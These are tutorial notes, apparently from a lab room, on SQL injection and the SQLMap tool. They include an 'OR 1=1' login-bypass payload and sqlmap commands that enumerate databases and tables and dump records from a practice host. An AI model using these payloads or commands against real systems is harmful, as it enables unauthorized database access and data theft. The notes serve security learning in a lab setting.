# SQLMap: The Basics

## Introduction
SQL injection is a common vulnerability where attackers manipulate SQL queries to gain unauthorized access to databases.

## How Websites Interact with Databases
- Websites store and retrieve data using **Database Management Systems (DBMS)** like MySQL, PostgreSQL, and Microsoft SQL Server.
- Structured Query Language (**SQL**) is used to interact with databases.
- User inputs (e.g., login credentials, search queries) are sent to the database via SQL queries.

## Example of SQL Injection
### Normal SQL Query for Authentication:
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

### Injected SQL Query to Bypass Authentication:
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```
- The condition `1=1` always evaluates to **true**, granting unauthorized access.

## SQLMap: Automated SQL Injection Tool
### Usage & Commands

#### Identify a vulnerable URL:
```sh
sqlmap -u http://sqlmaptesting.thm/search/cat=1
```

#### Extract database names:
```sh
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
```

#### Extract table names from a specific database:
```sh
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
```

#### Extract records from a specific table:
```sh
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
```

#### Testing an intercepted POST request:
```sh
sqlmap -r intercepted_request.txt
```

## Summary
- **SQL Injection** is a serious security risk.
- **Improper input validation** allows attackers to manipulate SQL queries.
- **SQLMap** automates the process of finding and exploiting SQL injection vulnerabilities.
